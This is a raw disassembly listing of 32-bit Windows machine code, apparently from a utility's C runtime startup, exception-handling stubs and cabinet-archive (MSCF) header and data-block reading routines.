 100643e:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
 1006442:	eb 2a                	jmp    0x100646e
 1006444:	83 b8 84 00 00 01 0e 	cmpl   $0xe,0x1000084(%eax)
 100644b:	76 f1                	jbe    0x100643e
 100644d:	33 c9                	xor    %ecx,%ecx
 100644f:	39 88 f8 00 00 01    	cmp    %ecx,0x10000f8(%eax)
 1006455:	eb 11                	jmp    0x1006468
 1006457:	83 b8 74 00 00 01 0e 	cmpl   $0xe,0x1000074(%eax)
 100645e:	76 de                	jbe    0x100643e
 1006460:	33 c9                	xor    %ecx,%ecx
 1006462:	39 88 e8 00 00 01    	cmp    %ecx,0x10000e8(%eax)
 1006468:	0f 95 c1             	setne  %cl
 100646b:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
 100646e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 1006472:	6a 01                	push   $0x1
 1006474:	ff 15 cc 21 00 01    	call   *0x10021cc
 100647a:	59                   	pop    %ecx
 100647b:	83 0d ec d3 01 01 ff 	orl    $0xffffffff,0x101d3ec
 1006482:	83 0d f0 d3 01 01 ff 	orl    $0xffffffff,0x101d3f0
 1006489:	ff 15 c8 21 00 01    	call   *0x10021c8
 100648f:	8b 0d 90 c3 00 01    	mov    0x100c390,%ecx
 1006495:	89 08                	mov    %ecx,(%eax)
 1006497:	ff 15 c4 21 00 01    	call   *0x10021c4
 100649d:	8b 0d 8c c3 00 01    	mov    0x100c38c,%ecx
 10064a3:	89 08                	mov    %ecx,(%eax)
 10064a5:	a1 a4 21 00 01       	mov    0x10021a4,%eax
 10064aa:	8b 00                	mov    (%eax),%eax
 10064ac:	a3 f4 d3 01 01       	mov    %eax,0x101d3f4
 10064b1:	e8 cd d2 ff ff       	call   0x1003783
 10064b6:	83 3d 2c c0 00 01 00 	cmpl   $0x0,0x100c02c
 10064bd:	75 0c                	jne    0x10064cb
 10064bf:	68 83 37 00 01       	push   $0x1003783
 10064c4:	ff 15 8c 21 00 01    	call   *0x100218c
 10064ca:	59                   	pop    %ecx
 10064cb:	e8 d1 00 00 00       	call   0x10065a1
 10064d0:	68 18 22 00 01       	push   $0x1002218
 10064d5:	68 14 22 00 01       	push   $0x1002214
 10064da:	e8 b7 00 00 00       	call   0x1006596
 10064df:	a1 88 c3 00 01       	mov    0x100c388,%eax
 10064e4:	89 45 dc             	mov    %eax,-0x24(%ebp)
 10064e7:	8d 45 dc             	lea    -0x24(%ebp),%eax
 10064ea:	50                   	push   %eax
 10064eb:	ff 35 84 c3 00 01    	push   0x100c384
 10064f1:	8d 45 e0             	lea    -0x20(%ebp),%eax
 10064f4:	50                   	push   %eax
 10064f5:	8d 45 d8             	lea    -0x28(%ebp),%eax
 10064f8:	50                   	push   %eax
 10064f9:	8d 45 d4             	lea    -0x2c(%ebp),%eax
 10064fc:	50                   	push   %eax
 10064fd:	ff 15 94 21 00 01    	call   *0x1002194
 1006503:	89 45 cc             	mov    %eax,-0x34(%ebp)
 1006506:	68 10 22 00 01       	push   $0x1002210
 100650b:	68 08 22 00 01       	push   $0x1002208
 1006510:	e8 81 00 00 00       	call   0x1006596
 1006515:	8b 45 e0             	mov    -0x20(%ebp),%eax
 1006518:	8b 0d 98 21 00 01    	mov    0x1002198,%ecx
 100651e:	89 01                	mov    %eax,(%ecx)
 1006520:	ff 75 e0             	push   -0x20(%ebp)
 1006523:	ff 75 d8             	push   -0x28(%ebp)
 1006526:	ff 75 d4             	push   -0x2c(%ebp)
 1006529:	e8 64 f9 ff ff       	call   0x1005e92
 100652e:	83 c4 30             	add    $0x30,%esp
 1006531:	8b f0                	mov    %eax,%esi
 1006533:	89 75 c8             	mov    %esi,-0x38(%ebp)
 1006536:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
 100653a:	75 07                	jne    0x1006543
 100653c:	56                   	push   %esi
 100653d:	ff 15 9c 21 00 01    	call   *0x100219c
 1006543:	ff 15 a0 21 00 01    	call   *0x10021a0
 1006549:	eb 2d                	jmp    0x1006578
 100654b:	8b 45 ec             	mov    -0x14(%ebp),%eax
 100654e:	8b 08                	mov    (%eax),%ecx
 1006550:	8b 09                	mov    (%ecx),%ecx
 1006552:	89 4d d0             	mov    %ecx,-0x30(%ebp)
 1006555:	50                   	push   %eax
 1006556:	51                   	push   %ecx
 1006557:	e8 2e 00 00 00       	call   0x100658a
 100655c:	59                   	pop    %ecx
 100655d:	59                   	pop    %ecx
 100655e:	c3                   	ret
 100655f:	8b 65 e8             	mov    -0x18(%ebp),%esp
 1006562:	8b 75 d0             	mov    -0x30(%ebp),%esi
 1006565:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
 1006569:	75 07                	jne    0x1006572
 100656b:	56                   	push   %esi
 100656c:	ff 15 a8 21 00 01    	call   *0x10021a8
 1006572:	ff 15 ac 21 00 01    	call   *0x10021ac
 1006578:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
 100657c:	8b c6                	mov    %esi,%eax
 100657e:	e8 70 00 00 00       	call   0x10065f3
 1006583:	c3                   	ret
 1006584:	cc                   	int3
 1006585:	cc                   	int3
 1006586:	cc                   	int3
 1006587:	cc                   	int3
 1006588:	cc                   	int3
 1006589:	cc                   	int3
 100658a:	ff 25 d8 21 00 01    	jmp    *0x10021d8
 1006590:	cc                   	int3
 1006591:	cc                   	int3
 1006592:	cc                   	int3
 1006593:	cc                   	int3
 1006594:	cc                   	int3
 1006595:	cc                   	int3
 1006596:	ff 25 90 21 00 01    	jmp    *0x1002190
 100659c:	cc                   	int3
 100659d:	cc                   	int3
 100659e:	cc                   	int3
 100659f:	cc                   	int3
 10065a0:	cc                   	int3
 10065a1:	68 00 00 03 00       	push   $0x30000
 10065a6:	68 00 00 01 00       	push   $0x10000
 10065ab:	e8 66 00 00 00       	call   0x1006616
 10065b0:	59                   	pop    %ecx
 10065b1:	59                   	pop    %ecx
 10065b2:	c3                   	ret
 10065b3:	cc                   	int3
 10065b4:	cc                   	int3
 10065b5:	cc                   	int3
 10065b6:	cc                   	int3
 10065b7:	cc                   	int3
 10065b8:	68 0a 66 00 01       	push   $0x100660a
 10065bd:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
 10065c3:	50                   	push   %eax
 10065c4:	8b 44 24 10          	mov    0x10(%esp),%eax
 10065c8:	89 6c 24 10          	mov    %ebp,0x10(%esp)
 10065cc:	8d 6c 24 10          	lea    0x10(%esp),%ebp
 10065d0:	2b e0                	sub    %eax,%esp
 10065d2:	53                   	push   %ebx
 10065d3:	56                   	push   %esi
 10065d4:	57                   	push   %edi
 10065d5:	8b 45 f8             	mov    -0x8(%ebp),%eax
 10065d8:	89 65 e8             	mov    %esp,-0x18(%ebp)
 10065db:	50                   	push   %eax
 10065dc:	8b 45 fc             	mov    -0x4(%ebp),%eax
 10065df:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
 10065e6:	89 45 f8             	mov    %eax,-0x8(%ebp)
 10065e9:	8d 45 f0             	lea    -0x10(%ebp),%eax
 10065ec:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
 10065f2:	c3                   	ret
 10065f3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
 10065f6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
 10065fd:	59                   	pop    %ecx
 10065fe:	5f                   	pop    %edi
 10065ff:	5e                   	pop    %esi
 1006600:	5b                   	pop    %ebx
 1006601:	c9                   	leave
 1006602:	51                   	push   %ecx
 1006603:	c3                   	ret
 1006604:	cc                   	int3
 1006605:	cc                   	int3
 1006606:	cc                   	int3
 1006607:	cc                   	int3
 1006608:	cc                   	int3
 1006609:	cc                   	int3
 100660a:	ff 25 d0 21 00 01    	jmp    *0x10021d0
 1006610:	cc                   	int3
 1006611:	cc                   	int3
 1006612:	cc                   	int3
 1006613:	cc                   	int3
 1006614:	cc                   	int3
 1006615:	cc                   	int3
 1006616:	ff 25 d4 21 00 01    	jmp    *0x10021d4
 100661c:	cc                   	int3
 100661d:	cc                   	int3
 100661e:	cc                   	int3
 100661f:	cc                   	int3
 1006620:	cc                   	int3
 1006621:	8b ff                	mov    %edi,%edi
 1006623:	55                   	push   %ebp
 1006624:	8b ec                	mov    %esp,%ebp
 1006626:	33 c0                	xor    %eax,%eax
 1006628:	39 45 0c             	cmp    %eax,0xc(%ebp)
 100662b:	75 07                	jne    0x1006634
 100662d:	b8 57 00 07 80       	mov    $0x80070057,%eax
 1006632:	eb 26                	jmp    0x100665a
 1006634:	8b 55 08             	mov    0x8(%ebp),%edx
 1006637:	56                   	push   %esi
 1006638:	8b 75 10             	mov    0x10(%ebp),%esi
 100663b:	8a 0e                	mov    (%esi),%cl
 100663d:	84 c9                	test   %cl,%cl
 100663f:	74 09                	je     0x100664a
 1006641:	88 0a                	mov    %cl,(%edx)
 1006643:	42                   	inc    %edx
 1006644:	46                   	inc    %esi
 1006645:	ff 4d 0c             	decl   0xc(%ebp)
 1006648:	75 f1                	jne    0x100663b
 100664a:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
 100664e:	5e                   	pop    %esi
 100664f:	75 06                	jne    0x1006657
 1006651:	4a                   	dec    %edx
 1006652:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
 1006657:	c6 02 00             	movb   $0x0,(%edx)
 100665a:	5d                   	pop    %ebp
 100665b:	c2 0c 00             	ret    $0xc
 100665e:	cc                   	int3
 100665f:	cc                   	int3
 1006660:	cc                   	int3
 1006661:	cc                   	int3
 1006662:	cc                   	int3
 1006663:	8b ff                	mov    %edi,%edi
 1006665:	55                   	push   %ebp
 1006666:	8b ec                	mov    %esp,%ebp
 1006668:	56                   	push   %esi
 1006669:	8b 75 0c             	mov    0xc(%ebp),%esi
 100666c:	33 c0                	xor    %eax,%eax
 100666e:	85 f6                	test   %esi,%esi
 1006670:	8b ce                	mov    %esi,%ecx
 1006672:	74 10                	je     0x1006684
 1006674:	8b 55 08             	mov    0x8(%ebp),%edx
 1006677:	80 3a 00             	cmpb   $0x0,(%edx)
 100667a:	74 04                	je     0x1006680
 100667c:	42                   	inc    %edx
 100667d:	4e                   	dec    %esi
 100667e:	75 f7                	jne    0x1006677
 1006680:	85 f6                	test   %esi,%esi
 1006682:	75 05                	jne    0x1006689
 1006684:	b8 57 00 07 80       	mov    $0x80070057,%eax
 1006689:	8b 55 10             	mov    0x10(%ebp),%edx
 100668c:	85 d2                	test   %edx,%edx
 100668e:	74 0d                	je     0x100669d
 1006690:	85 c0                	test   %eax,%eax
 1006692:	7c 06                	jl     0x100669a
 1006694:	2b ce                	sub    %esi,%ecx
 1006696:	89 0a                	mov    %ecx,(%edx)
 1006698:	eb 03                	jmp    0x100669d
 100669a:	83 22 00             	andl   $0x0,(%edx)
 100669d:	5e                   	pop    %esi
 100669e:	5d                   	pop    %ebp
 100669f:	c2 0c 00             	ret    $0xc
 10066a2:	cc                   	int3
 10066a3:	cc                   	int3
 10066a4:	cc                   	int3
 10066a5:	cc                   	int3
 10066a6:	cc                   	int3
 10066a7:	8b ff                	mov    %edi,%edi
 10066a9:	55                   	push   %ebp
 10066aa:	8b ec                	mov    %esp,%ebp
 10066ac:	56                   	push   %esi
 10066ad:	8b 75 08             	mov    0x8(%ebp),%esi
 10066b0:	68 04 08 00 00       	push   $0x804
 10066b5:	ff d6                	call   *%esi
 10066b7:	59                   	pop    %ecx
 10066b8:	33 c9                	xor    %ecx,%ecx
 10066ba:	3b c1                	cmp    %ecx,%eax
 10066bc:	75 0f                	jne    0x10066cd
 10066be:	51                   	push   %ecx
 10066bf:	6a 05                	push   $0x5
 10066c1:	ff 75 28             	push   0x28(%ebp)
 10066c4:	e8 eb 11 00 00       	call   0x10078b4
 10066c9:	33 c0                	xor    %eax,%eax
 10066cb:	eb 69                	jmp    0x1006736
 10066cd:	8b 55 0c             	mov    0xc(%ebp),%edx
 10066d0:	83 88 88 00 00 00 ff 	orl    $0xffffffff,0x88(%eax)
 10066d7:	83 88 84 00 00 00 ff 	orl    $0xffffffff,0x84(%eax)
 10066de:	89 50 04             	mov    %edx,0x4(%eax)
 10066e1:	8b 55 10             	mov    0x10(%ebp),%edx
 10066e4:	89 50 0c             	mov    %edx,0xc(%eax)
 10066e7:	8b 55 14             	mov    0x14(%ebp),%edx
 10066ea:	89 50 10             	mov    %edx,0x10(%eax)
 10066ed:	8b 55 18             	mov    0x18(%ebp),%edx
 10066f0:	89 50 14             	mov    %edx,0x14(%eax)
 10066f3:	8b 55 1c             	mov    0x1c(%ebp),%edx
 10066f6:	89 50 18             	mov    %edx,0x18(%eax)
 10066f9:	8b 55 20             	mov    0x20(%ebp),%edx
 10066fc:	89 50 1c             	mov    %edx,0x1c(%eax)
 10066ff:	8b 55 24             	mov    0x24(%ebp),%edx
 1006702:	89 50 20             	mov    %edx,0x20(%eax)
 1006705:	8b 55 28             	mov    0x28(%ebp),%edx
 1006708:	89 48 48             	mov    %ecx,0x48(%eax)
 100670b:	89 48 44             	mov    %ecx,0x44(%eax)
 100670e:	89 48 4c             	mov    %ecx,0x4c(%eax)
 1006711:	b9 ff ff 00 00       	mov    $0xffff,%ecx
 1006716:	89 70 08             	mov    %esi,0x8(%eax)
 1006719:	89 10                	mov    %edx,(%eax)
 100671b:	66 c7 80 b2 00 00 00 	movw   $0xf,0xb2(%eax)
 1006722:	0f 00 
 1006724:	89 88 a0 00 00 00    	mov    %ecx,0xa0(%eax)
 100672a:	89 88 a8 00 00 00    	mov    %ecx,0xa8(%eax)
 1006730:	89 88 a4 00 00 00    	mov    %ecx,0xa4(%eax)
 1006736:	5e                   	pop    %esi
 1006737:	5d                   	pop    %ebp
 1006738:	c3                   	ret
 1006739:	cc                   	int3
 100673a:	cc                   	int3
 100673b:	cc                   	int3
 100673c:	cc                   	int3
 100673d:	cc                   	int3
 100673e:	8b ff                	mov    %edi,%edi
 1006740:	55                   	push   %ebp
 1006741:	8b ec                	mov    %esp,%ebp
 1006743:	83 ec 24             	sub    $0x24,%esp
 1006746:	56                   	push   %esi
 1006747:	8b 75 08             	mov    0x8(%ebp),%esi
 100674a:	6a 24                	push   $0x24
 100674c:	8d 45 dc             	lea    -0x24(%ebp),%eax
 100674f:	50                   	push   %eax
 1006750:	ff 75 0c             	push   0xc(%ebp)
 1006753:	ff 56 10             	call   *0x10(%esi)
 1006756:	83 c4 0c             	add    $0xc,%esp
 1006759:	83 f8 24             	cmp    $0x24,%eax
 100675c:	75 1f                	jne    0x100677d
 100675e:	81 7d dc 4d 53 43 46 	cmpl   $0x4643534d,-0x24(%ebp)
 1006765:	75 16                	jne    0x100677d
 1006767:	66 81 7d f4 03 01    	cmpw   $0x103,-0xc(%ebp)
 100676d:	74 12                	je     0x1006781
 100676f:	0f b7 45 f4          	movzwl -0xc(%ebp),%eax
 1006773:	50                   	push   %eax
 1006774:	6a 03                	push   $0x3
 1006776:	ff 36                	push   (%esi)
 1006778:	e8 37 11 00 00       	call   0x10078b4
 100677d:	33 c0                	xor    %eax,%eax
 100677f:	eb 48                	jmp    0x10067c9
 1006781:	8b 45 10             	mov    0x10(%ebp),%eax
 1006784:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
 1006787:	89 08                	mov    %ecx,(%eax)
 1006789:	66 8b 4d f6          	mov    -0xa(%ebp),%cx
 100678d:	66 89 48 04          	mov    %cx,0x4(%eax)
 1006791:	66 8b 4d f8          	mov    -0x8(%ebp),%cx
 1006795:	66 89 48 06          	mov    %cx,0x6(%eax)
 1006799:	66 8b 4d fc          	mov    -0x4(%ebp),%cx
 100679d:	66 89 48 08          	mov    %cx,0x8(%eax)
 10067a1:	66 8b 4d fe          	mov    -0x2(%ebp),%cx
 10067a5:	66 89 48 0a          	mov    %cx,0xa(%eax)
 10067a9:	0f b7 4d fa          	movzwl -0x6(%ebp),%ecx
 10067ad:	8b d1                	mov    %ecx,%edx
 10067af:	c1 ea 02             	shr    $0x2,%edx
 10067b2:	83 e2 01             	and    $0x1,%edx
 10067b5:	89 50 0c             	mov    %edx,0xc(%eax)
 10067b8:	8b d1                	mov    %ecx,%edx
 10067ba:	83 e2 01             	and    $0x1,%edx
 10067bd:	83 e1 02             	and    $0x2,%ecx
 10067c0:	89 50 10             	mov    %edx,0x10(%eax)
 10067c3:	89 48 14             	mov    %ecx,0x14(%eax)
 10067c6:	33 c0                	xor    %eax,%eax
 10067c8:	40                   	inc    %eax
 10067c9:	5e                   	pop    %esi
 10067ca:	c9                   	leave
 10067cb:	c3                   	ret
 10067cc:	cc                   	int3
 10067cd:	cc                   	int3
 10067ce:	cc                   	int3
 10067cf:	cc                   	int3
 10067d0:	cc                   	int3
 10067d1:	8b ff                	mov    %edi,%edi
 10067d3:	55                   	push   %ebp
 10067d4:	8b ec                	mov    %esp,%ebp
 10067d6:	53                   	push   %ebx
 10067d7:	56                   	push   %esi
 10067d8:	8b 75 08             	mov    0x8(%ebp),%esi
 10067db:	8d 86 bc 07 00 00    	lea    0x7bc(%esi),%eax
 10067e1:	8d 8e b7 03 00 00    	lea    0x3b7(%esi),%ecx
 10067e7:	89 48 04             	mov    %ecx,0x4(%eax)
 10067ea:	8d 8e b8 04 00 00    	lea    0x4b8(%esi),%ecx
 10067f0:	89 48 08             	mov    %ecx,0x8(%eax)
 10067f3:	8d 8e b9 05 00 00    	lea    0x5b9(%esi),%ecx
 10067f9:	89 48 0c             	mov    %ecx,0xc(%eax)
 10067fc:	8b 4e 38             	mov    0x38(%esi),%ecx
 10067ff:	89 48 10             	mov    %ecx,0x10(%eax)
 1006802:	66 8b 4e 70          	mov    0x70(%esi),%cx
 1006806:	57                   	push   %edi
 1006807:	66 89 48 1e          	mov    %cx,0x1e(%eax)
 100680b:	66 8b 4e 72          	mov    0x72(%esi),%cx
 100680f:	50                   	push   %eax
 1006810:	33 db                	xor    %ebx,%ebx
 1006812:	53                   	push   %ebx
 1006813:	8d be e4 07 00 00    	lea    0x7e4(%esi),%edi
 1006819:	66 89 48 20          	mov    %cx,0x20(%eax)
 100681d:	ff 56 24             	call   *0x24(%esi)
 1006820:	83 f8 ff             	cmp    $0xffffffff,%eax
 1006823:	59                   	pop    %ecx
 1006824:	59                   	pop    %ecx
 1006825:	74 37                	je     0x100685e
 1006827:	39 5e 28             	cmp    %ebx,0x28(%esi)
 100682a:	74 40                	je     0x100686c
 100682c:	89 1f                	mov    %ebx,(%edi)
 100682e:	8b 46 38             	mov    0x38(%esi),%eax
 1006831:	89 47 04             	mov    %eax,0x4(%edi)
 1006834:	8b 46 4c             	mov    0x4c(%esi),%eax
 1006837:	89 47 08             	mov    %eax,0x8(%edi)
 100683a:	66 8b 86 a0 00 00 00 	mov    0xa0(%esi),%ax
 1006841:	66 89 47 0c          	mov    %ax,0xc(%edi)
 1006845:	66 8b 46 70          	mov    0x70(%esi),%ax
 1006849:	66 89 47 0e          	mov    %ax,0xe(%edi)
 100684d:	0f b7 46 72          	movzwl 0x72(%esi),%eax
 1006851:	57                   	push   %edi
 1006852:	89 47 10             	mov    %eax,0x10(%edi)
 1006855:	ff 56 28             	call   *0x28(%esi)
 1006858:	83 f8 ff             	cmp    $0xffffffff,%eax
 100685b:	59                   	pop    %ecx
 100685c:	75 0e                	jne    0x100686c
 100685e:	53                   	push   %ebx
 100685f:	6a 0b                	push   $0xb
 1006861:	ff 36                	push   (%esi)
 1006863:	e8 4c 10 00 00       	call   0x10078b4
 1006868:	33 c0                	xor    %eax,%eax
 100686a:	eb 03                	jmp    0x100686f
 100686c:	33 c0                	xor    %eax,%eax
 100686e:	40                   	inc    %eax
 100686f:	5f                   	pop    %edi
 1006870:	5e                   	pop    %esi
 1006871:	5b                   	pop    %ebx
 1006872:	5d                   	pop    %ebp
 1006873:	c2 04 00             	ret    $0x4
 1006876:	cc                   	int3
 1006877:	cc                   	int3
 1006878:	cc                   	int3
 1006879:	cc                   	int3
 100687a:	cc                   	int3
 100687b:	8b ff                	mov    %edi,%edi
 100687d:	55                   	push   %ebp
 100687e:	8b ec                	mov    %esp,%ebp
 1006880:	53                   	push   %ebx
 1006881:	56                   	push   %esi
 1006882:	8b 75 08             	mov    0x8(%ebp),%esi
 1006885:	57                   	push   %edi
 1006886:	ff b6 a8 00 00 00    	push   0xa8(%esi)
 100688c:	8d be e4 07 00 00    	lea    0x7e4(%esi),%edi
 1006892:	ff 76 48             	push   0x48(%esi)
 1006895:	ff b6 84 00 00 00    	push   0x84(%esi)
 100689b:	ff 56 10             	call   *0x10(%esi)
 100689e:	83 c4 0c             	add    $0xc,%esp
 10068a1:	39 86 a8 00 00 00    	cmp    %eax,0xa8(%esi)
 10068a7:	0f 85 f5 00 00 00    	jne    0x10069a2
 10068ad:	8b 46 48             	mov    0x48(%esi),%eax
 10068b0:	0f b7 40 04          	movzwl 0x4(%eax),%eax
 10068b4:	8b 5d 0c             	mov    0xc(%ebp),%ebx
 10068b7:	03 c3                	add    %ebx,%eax
 10068b9:	3b 86 98 00 00 00    	cmp    0x98(%esi),%eax
 10068bf:	0f 87 dd 00 00 00    	ja     0x10069a2
 10068c5:	8b 46 48             	mov    0x48(%esi),%eax
 10068c8:	0f b7 40 04          	movzwl 0x4(%eax),%eax
 10068cc:	50                   	push   %eax
 10068cd:	8b 46 3c             	mov    0x3c(%esi),%eax
 10068d0:	03 c3                	add    %ebx,%eax
 10068d2:	50                   	push   %eax
 10068d3:	ff b6 84 00 00 00    	push   0x84(%esi)
 10068d9:	ff 56 10             	call   *0x10(%esi)
 10068dc:	8b 4e 48             	mov    0x48(%esi),%ecx
 10068df:	0f b7 49 04          	movzwl 0x4(%ecx),%ecx
 10068e3:	83 c4 0c             	add    $0xc,%esp
 10068e6:	3b c8                	cmp    %eax,%ecx
 10068e8:	0f 85 b4 00 00 00    	jne    0x10069a2
 10068ee:	8b 46 48             	mov    0x48(%esi),%eax
 10068f1:	33 c9                	xor    %ecx,%ecx
 10068f3:	39 08                	cmp    %ecx,(%eax)
 10068f5:	74 31                	je     0x1006928
 10068f7:	0f b7 40 04          	movzwl 0x4(%eax),%eax
 10068fb:	51                   	push   %ecx
 10068fc:	50                   	push   %eax
 10068fd:	8b 46 3c             	mov    0x3c(%esi),%eax
 1006900:	03 c3                	add    %ebx,%eax
 1006902:	50                   	push   %eax
 1006903:	e8 cf 0f 00 00       	call   0x10078d7
 1006908:	50                   	push   %eax
 1006909:	8b 86 a8 00 00 00    	mov    0xa8(%esi),%eax
 100690f:	83 e8 04             	sub    $0x4,%eax
 1006912:	50                   	push   %eax
 1006913:	8b 46 48             	mov    0x48(%esi),%eax
 1006916:	83 c0 04             	add    $0x4,%eax
 1006919:	50                   	push   %eax
 100691a:	e8 b8 0f 00 00       	call   0x10078d7
 100691f:	8b 4e 48             	mov    0x48(%esi),%ecx
 1006922:	3b 01                	cmp    (%ecx),%eax
 1006924:	75 7c                	jne    0x10069a2
 1006926:	33 c9                	xor    %ecx,%ecx
 1006928:	8b 46 48             	mov    0x48(%esi),%eax
 100692b:	66 01 58 04          	add    %bx,0x4(%eax)
 100692f:	3b d9                	cmp    %ecx,%ebx
 1006931:	77 0d                	ja     0x1006940
 1006933:	8b 46 48             	mov    0x48(%esi),%eax
 1006936:	66 39 48 06          	cmp    %cx,0x6(%eax)
 100693a:	74 04                	je     0x1006940
 100693c:	33 d2                	xor    %edx,%edx
 100693e:	eb 03                	jmp    0x1006943
 1006940:	33 d2                	xor    %edx,%edx
 1006942:	42                   	inc    %edx
 1006943:	39 4e 28             	cmp    %ecx,0x28(%esi)
 1006946:	74 55                	je     0x100699d
 1006948:	c7 07 02 00 00 00    	movl   $0x2,(%edi)
 100694e:	8b 46 38             	mov    0x38(%esi),%eax
 1006951:	89 47 04             	mov    %eax,0x4(%edi)
 1006954:	66 8b 86 a8 00 00 00 	mov    0xa8(%esi),%ax
 100695b:	66 2d 08 00          	sub    $0x8,%ax
 100695f:	66 89 47 0c          	mov    %ax,0xc(%edi)
 1006963:	74 0b                	je     0x1006970
 1006965:	8b 46 48             	mov    0x48(%esi),%eax
 1006968:	83 c0 08             	add    $0x8,%eax
 100696b:	89 47 08             	mov    %eax,0x8(%edi)
 100696e:	eb 03                	jmp    0x1006973
 1006970:	89 4f 08             	mov    %ecx,0x8(%edi)
 1006973:	8b 46 3c             	mov    0x3c(%esi),%eax
 1006976:	03 c3                	add    %ebx,%eax
 1006978:	89 47 10             	mov    %eax,0x10(%edi)
 100697b:	8b 46 48             	mov    0x48(%esi),%eax
 100697e:	66 8b 40 04          	mov    0x4(%eax),%ax
 1006982:	57                   	push   %edi
 1006983:	66 89 47 14          	mov    %ax,0x14(%edi)
 1006987:	89 57 18             	mov    %edx,0x18(%edi)
 100698a:	66 89 5f 1c          	mov    %bx,0x1c(%edi)
 100698e:	ff 56 28             	call   *0x28(%esi)
 1006991:	83 f8 ff             	cmp    $0xffffffff,%eax
 1006994:	59                   	pop    %ecx
 1006995:	75 06                	jne    0x100699d
 1006997:	6a 00                	push   $0x0
 1006999:	6a 0b                	push   $0xb
 100699b:	eb 09                	jmp    0x10069a6
 100699d:	33 c0                	xor    %eax,%eax
 100699f:	40                   	inc    %eax
 10069a0:	eb 0d                	jmp    0x10069af
 10069a2:	6a 00                	push   $0x0
 10069a4:	6a 04                	push   $0x4
 10069a6:	ff 36                	push   (%esi)
 10069a8:	e8 07 0f 00 00       	call   0x10078b4
 10069ad:	33 c0                	xor    %eax,%eax
 10069af:	5f                   	pop    %edi
 10069b0:	5e                   	pop    %esi
 10069b1:	5b                   	pop    %ebx
 10069b2:	5d                   	pop    %ebp
 10069b3:	c2 08 00             	ret    $0x8
 10069b6:	cc                   	int3
 10069b7:	cc                   	int3
 10069b8:	cc                   	int3
 10069b9:	cc                   	int3
 10069ba:	cc                   	int3
 10069bb:	8b ff                	mov    %edi,%edi
 10069bd:	55                   	push   %ebp
 10069be:	8b ec                	mov    %esp,%ebp
 10069c0:	53                   	push   %ebx
 10069c1:	56                   	push   %esi
 10069c2:	8b 75 10             	mov    0x10(%ebp),%esi
 10069c5:	57                   	push   %edi
 10069c6:	6a 01                	push   $0x1
 10069c8:	6a 00                	push   $0x0
 10069ca:	ff b6 88 00 00 00    	push   0x88(%esi)
 10069d0:	ff 56 1c             	call   *0x1c(%esi)
 10069d3:	8b 5d 0c             	mov    0xc(%ebp),%ebx
 10069d6:	8b 7d 08             	mov    0x8(%ebp),%edi
 10069d9:	53                   	push   %ebx
 10069da:	57                   	push   %edi
 10069db:	ff b6 88 00 00 00    	push   0x88(%esi)
 10069e1:	89 45 10             	mov    %eax,0x10(%ebp)
 10069e4:	ff 56 10             	call   *0x10(%esi)
 10069e7:	83 c4 18             	add    $0x18,%esp
 10069ea:	85 c0                	test   %eax,%eax
 10069ec:	7e 3d                	jle    0x1006a2b
 10069ee:	8a 4c 1f ff          	mov    -0x1(%edi,%ebx,1),%cl
 10069f2:	8b c7                	mov    %edi,%eax
 10069f4:	c6 44 1f ff 00       	movb   $0x0,-0x1(%edi,%ebx,1)
 10069f9:	8d 78 01             	lea    0x1(%eax),%edi
 10069fc:	8a 10                	mov    (%eax),%dl
 10069fe:	40                   	inc    %eax
 10069ff:	84 d2                	test   %dl,%dl
 1006a01:	75 f9                	jne    0x10069fc
 1006a03:	2b c7                	sub    %edi,%eax
 1006a05:	8d 50 01             	lea    0x1(%eax),%edx
 1006a08:	3b d3                	cmp    %ebx,%edx
 1006a0a:	7c 04                	jl     0x1006a10
 1006a0c:	84 c9                	test   %cl,%cl
 1006a0e:	75 1b                	jne    0x1006a2b
 1006a10:	8b 4d 10             	mov    0x10(%ebp),%ecx
 1006a13:	6a 00                	push   $0x0
 1006a15:	8d 44 08 01          	lea    0x1(%eax,%ecx,1),%eax
 1006a19:	50                   	push   %eax
 1006a1a:	ff b6 88 00 00 00    	push   0x88(%esi)
 1006a20:	ff 56 1c             	call   *0x1c(%esi)
 1006a23:	83 c4 0c             	add    $0xc,%esp
 1006a26:	83 f8 ff             	cmp    $0xffffffff,%eax
 1006a29:	75 0f                	jne    0x1006a3a
 1006a2b:	6a 00                	push   $0x0
 1006a2d:	6a 04                	push   $0x4
 1006a2f:	ff 36                	push   (%esi)
 1006a31:	e8 7e 0e 00 00       	call   0x10078b4
 1006a36:	33 c0                	xor    %eax,%eax
 1006a38:	eb 03                	jmp    0x1006a3d
 1006a3a:	33 c0                	xor    %eax,%eax
 1006a3c:	40                   	inc    %eax
 1006a3d:	5f                   	pop    %edi
 1006a3e:	5e                   	pop    %esi
 1006a3f:	5b                   	pop    %ebx
 1006a40:	5d                   	pop    %ebp
 1006a41:	c2 0c 00             	ret    $0xc
 1006a44:	cc                   	int3
 1006a45:	cc                   	int3
 1006a46:	cc                   	int3
 1006a47:	cc                   	int3
 1006a48:	cc                   	int3
 1006a49:	8b ff                	mov    %edi,%edi
 1006a4b:	55                   	push   %ebp
 1006a4c:	8b ec                	mov    %esp,%ebp
 1006a4e:	53                   	push   %ebx
 1006a4f:	56                   	push   %esi
 1006a50:	8b 75 08             	mov    0x8(%ebp),%esi
 1006a53:	6a 01                	push   $0x1
 1006a55:	6a 00                	push   $0x0
 1006a57:	ff b6 88 00 00 00    	push   0x88(%esi)
 1006a5d:	ff 56 1c             	call   *0x1c(%esi)
 1006a60:	8b d8                	mov    %eax,%ebx
 1006a62:	83 c4 0c             	add    $0xc,%esp
 1006a65:	83 fb ff             	cmp    $0xffffffff,%ebx
 1006a68:	75 0f                	jne    0x1006a79
 1006a6a:	6a 00                	push   $0x0
 1006a6c:	6a 04                	push   $0x4
 1006a6e:	ff 36                	push   (%esi)
 1006a70:	e8 3f 0e 00 00       	call   0x10078b4
 1006a75:	33 c0                	xor    %eax,%eax
 1006a77:	eb 78                	jmp    0x1006af1
